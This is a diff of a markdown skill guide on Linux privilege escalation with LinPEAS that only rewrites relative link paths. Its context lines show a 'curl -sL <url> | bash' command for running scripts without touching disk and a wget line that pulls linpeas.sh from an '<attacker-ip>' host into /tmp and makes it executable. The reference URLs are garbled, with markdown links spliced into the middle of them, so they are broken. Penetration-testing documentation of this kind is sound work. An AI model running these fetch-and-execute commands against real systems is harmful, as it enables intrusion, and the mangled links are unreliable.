@@ -222,7 +222,7 @@ See [../../../Global_References/mitre_mapping.md](../../../Global_References/mit
 # Run from memory (no disk write)
 curl -sL <url> | bash
 
-# Or use pspy for process [monitoring](../../DevOps_and_Cloud/Observability_and_SecOps/monitoring/SKILL.md) only
+# Or use pspy for process [monitoring](../../observability-monitoring-logging/common/monitoring-strategy/monitoring/SKILL.md) only
 ./pspy64
 ```
 
@@ -250,7 +250,7 @@ wget http://<attacker-ip>:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh &
 ## References
 
 - [LinPEAS GitHub](https://[github](../../ci-cd/github-actions/other/github/SKILL.md).com/peass-ng/PEASS-ng/tree/master/linPEAS)
-- [HackTricks Linux Privesc](https://book.hacktricks.xyz/[linux-hardening](../../DevOps_and_Cloud/Observability_and_SecOps/linux-hardening/SKILL.md)/privilege-escalation)
+- [HackTricks Linux Privesc](https://book.hacktricks.xyz/[linux-hardening](../linux-hardening/SKILL.md)/privilege-escalation)
 - [GTFOBins](https://gtfobins.[github](../../ci-cd/github-actions/other/github/SKILL.md).io/)
 - [MITRE ATT&CK TA0004 Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
 - [MITRE ATT&CK TA0007 Discovery](https://attack.mitre.org/tactics/TA0007/)
